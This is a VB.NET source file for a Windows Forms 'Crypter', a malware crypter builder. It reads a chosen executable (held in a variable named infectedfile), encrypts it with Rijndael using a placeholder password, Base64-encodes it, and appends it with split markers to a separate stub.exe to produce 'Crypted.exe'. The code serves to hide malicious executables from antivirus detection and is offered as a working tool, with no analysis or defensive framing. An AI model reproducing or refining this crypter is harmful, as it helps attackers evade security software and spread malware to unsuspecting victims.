Imports System.Security.Cryptography
Imports System.IO
Public Class Form1
    Dim infectedfile, stub As String
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim openFileDialog1 As New OpenFileDialog

        With openFileDialog1
            .FileName = ""
            .Filter = "Executable(*.exe)|*.exe"
            .Title = "Crypter"
            .ShowDialog()
            TextBox1.Text = .FileName
            infectedfile = TextBox1.Text
        End With
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim key As String = "YOUR@PASSWORD@HERE"
        Dim Splitt As String = "Your@Split@Here"
        Dim Cryptfile As String
        FileOpen(1, Application.StartupPath + "\stub.exe", OpenMode.Binary)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        FileOpen(1, (TextBox1.Text), OpenMode.Binary)
        infectedfile = Space(LOF(1))
        FileGet(1, infectedfile)
        FileClose(1)
        Cryptfile = infectedfile
        Dim oAesProvider As New RijndaelManaged
        Dim btClear() As Byte

        Dim btSalt() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}

        Dim oKeyGenerator As New Rfc2898DeriveBytes(key, btSalt)

        oAesProvider.Key = oKeyGenerator.GetBytes(oAesProvider.Key.Length)
        oAesProvider.IV = oKeyGenerator.GetBytes(oAesProvider.IV.Length)

        Dim ms As New IO.MemoryStream
        Dim cs As New CryptoStream(ms,
            oAesProvider.CreateEncryptor(),
            CryptoStreamMode.Write)
        btClear = System.Text.Encoding.UTF8.GetBytes(Cryptfile)
        cs.Write(btClear, 0, btClear.Length)
        cs.Close()
        Cryptfile = Convert.ToBase64String(ms.ToArray)
        FileOpen(1, Application.StartupPath + "\Crypted.exe", OpenMode.Binary)
        FilePut(1, stub)
        FilePut(1, Splitt)
        FilePut(1, Cryptfile)
        FilePut(1, Splitt)
        FileClose(1)
        MsgBox("Obfuscated")
        MsgBox("Developed by: Anubhav", MsgBoxStyle.Information, "Success")
    End Sub


End Class
